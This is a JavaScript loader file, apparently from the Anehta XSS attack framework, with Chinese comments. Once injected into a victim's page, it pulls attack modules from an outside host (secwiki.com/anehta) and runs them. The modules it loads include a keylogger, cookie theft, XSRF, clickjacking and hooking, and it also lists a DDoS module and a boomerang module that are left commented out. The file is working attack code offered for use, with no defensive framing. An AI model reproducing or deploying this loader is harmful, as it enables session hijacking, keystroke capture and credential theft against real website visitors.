//////////////////////////////////////////////////////////////
// feed.js 是中心控制文件，在这里插入各种脚本模块
// Author: axis
//alert("feed.js 种子");
var $d=document;

// anehta files url
var anehtaurl = "http://www.secwiki.com/anehta";

///////////////////////////////////////////////////////////////////////
// function library
var BaseLib = anehtaurl+"/library/base.js";
var Base64Lib = anehtaurl+"/library/base64.js";
var AjaxLib = anehtaurl+"/library/ajax.js";
var UtfLib = anehtaurl+"/library/utf.js";
var HookLib = anehtaurl+"/library/hooklib.js";
var JqueryLib = anehtaurl+"/library/jquery.js";

///////////////////////////////////////////////////////////////////////
// Module
var BoomerangMod = anehtaurl+"/module/boomerang.js";
var ClxMod = anehtaurl+"/module/clx.js";
var XsrfMod = anehtaurl+"/module/xsrf.js";
var DdosMod = anehtaurl+"/module/ddos.js";
var HookMod = anehtaurl+"/module/hook.js";
var KeyloggerMod = anehtaurl+"/module/keylog.js";
var XCookieMod = anehtaurl+"/module/xcookie.js";

///////////////////////////////////////////////////////////////////////

function InjectScript(ptr_sc){
    s=document.createElement("script");
    s.src=ptr_sc;
    document.getElementsByTagName("body")[0].appendChild(s);
}

function AddScript(ptr_sc){
    $d.write("<script src='"+ptr_sc+"'></script>");
}

/////////////////////////////////////
////// 模块加载
try {
    //InjectScript 和 AddScript 都不是很稳定,看情况选用 
    
    //InjectScript(BaseLib);
    //InjectScript(UtfLib);
    //InjectScript(JqueryLib);
    
    //InjectScript(ClxMod);
    //InjectScript(XsrfMod);
    //InjectScript(XCookieMod);
    //InjectScript(BoomerangMod);
    //InjectScript(DdosMod);
    //InjectScript(HookMod);
    //InjectScript(KeyloggerMod);
    
    ///////////////////////////////////////////////////
    AddScript(BaseLib);
    //AddScript(UtfLib);
    AddScript(JqueryLib);
    
    AddScript(ClxMod);
    AddScript(XsrfMod);
    AddScript(XCookieMod);
    //AddScript(BoomerangMod); 可以不用在feed.js里加,xcookie模块会自动判断浏览器并添加
    //AddScript(DdosMod);
    AddScript(HookMod);
    AddScript(KeyloggerMod);
}
catch (e){
    //alert(e);
}